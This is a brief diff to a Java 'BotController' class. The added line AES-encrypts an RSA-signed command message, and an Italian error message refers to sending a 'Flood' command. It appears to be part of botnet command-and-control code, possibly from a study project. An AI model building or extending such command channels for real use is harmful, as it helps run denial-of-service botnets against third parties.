@@ -67,6 +67,7 @@ public class BotController {
 		try {
 			signature = pki.signMessageRSA(hashIdMsg);
 			msg = hashIdMsg + "|" + cmd + "|" + signature;
+			msg=pki.getCrypto().encryptAES(msg);
 		} catch (InvalidKeyException | SignatureException e) {
 			e.printStackTrace();
 			System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
